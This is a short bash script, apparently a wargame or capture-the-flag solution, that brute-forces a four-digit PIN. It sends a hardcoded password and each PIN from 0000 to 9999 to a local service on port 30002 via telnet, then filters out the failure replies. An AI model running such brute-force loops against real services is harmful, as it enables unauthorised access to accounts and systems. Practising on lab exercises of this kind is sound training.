#!/bin/bash
for x in {0..9}{0..9}{0..9}{0..9}; do
  echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $x | telnet localhost 30002 | egrep -v  "Exiting|Wrong|I am";
  echo "Try $x";
done

